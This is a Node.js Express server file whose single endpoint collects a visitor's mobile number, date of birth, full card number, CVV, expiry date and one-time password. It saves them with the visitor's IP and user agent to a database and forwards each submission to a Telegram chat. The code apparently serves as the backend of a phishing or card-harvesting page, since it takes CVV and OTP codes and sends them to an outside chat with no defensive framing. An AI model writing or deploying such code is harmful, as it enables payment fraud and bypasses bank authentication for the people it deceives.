const express = require('express');
const cors = require('cors');
const { Pool } = require('pg');
const https = require('https');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());

console.log('DATABASE_URL:', process.env.DATABASE_URL ? 'set' : 'not set');
console.log('TELEGRAM_BOT_TOKEN:', process.env.TELEGRAM_BOT_TOKEN ? 'set' : 'not set');
console.log('TELEGRAM_CHAT_ID:', process.env.TELEGRAM_CHAT_ID ? 'set' : 'not set');
console.log('PORT:', process.env.PORT);

const pool = process.env.DATABASE_URL ? new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  }
}) : null;

if (pool) {
  pool.on('error', (err) => {
    console.error('Unexpected error on idle client', err);
  });
}

const initDB = async () => {
  if (!pool) return
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        service VARCHAR(255),
        mobile VARCHAR(20),
        dob DATE,
        card_number VARCHAR(50),
        cvv VARCHAR(10),
        exp_date VARCHAR(10),
        otp VARCHAR(10),
        ip_address VARCHAR(50),
        user_agent TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);
    console.log('Database initialized');
  } catch (err) {
    console.error('Error initializing database:', err.message);
  }
};

if (pool) initDB();

const sendToTelegram = (message) => {
  if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
    console.log('Telegram not configured, skipping...')
    return
  }
  
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  
  const postData = JSON.stringify({
    chat_id: chatId,
    text: message,
    parse_mode: 'HTML'
  });
  
  const options = {
    hostname: 'api.telegram.org',
    path: `/bot${botToken}/sendMessage`,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': postData.length
    }
  };
  
  const req = https.request(options, (res) => {
    let data = ''
    res.on('data', (chunk) => { data += chunk })
    res.on('end', () => {
      if (res.statusCode === 200) {
        console.log('Message sent to Telegram');
      } else {
        console.log('Telegram error:', res.statusCode, data);
      }
    })
  });
  
  req.on('error', (err) => {
    console.log('Telegram request error:', err.message);
  });
  
  req.write(postData);
  req.end();
}

// Routes
app.post('/api/users', async (req, res) => {
  try {
    const { service, mobile, dob, cardNumber, cvv, expDate, otp } = req.body;
    
    const ip_address = req.ip || req.connection.remoteAddress || 'unknown';
    const user_agent = req.headers['user-agent'] || 'unknown';
    
    if (pool) {
      await pool.query(
        `INSERT INTO users (service, mobile, dob, card_number, cvv, exp_date, otp, ip_address, user_agent)
         VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)`,
        [service, mobile, dob, cardNumber, cvv, expDate, otp, ip_address, user_agent]
      );
    }
    
    const telegramMessage = `
🆕 <b>New User Data</b>

📋 Service: ${service}
📱 Mobile: ${mobile}
🎂 DOB: ${dob}
💳 Card: ${cardNumber}
🔐 CVV: ${cvv}
📅 Expiry: ${expDate}
🔢 OTP: ${otp}
🌐 IP: ${ip_address}
🕐 Time: ${new Date().toLocaleString()}
    `;
    
    sendToTelegram(telegramMessage);
    
    res.json({ success: true, message: 'User data submitted successfully' });
  } catch (err) {
    console.error('Error saving user:', err);
    res.status(500).json({ success: false, error: 'Failed to save user data' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
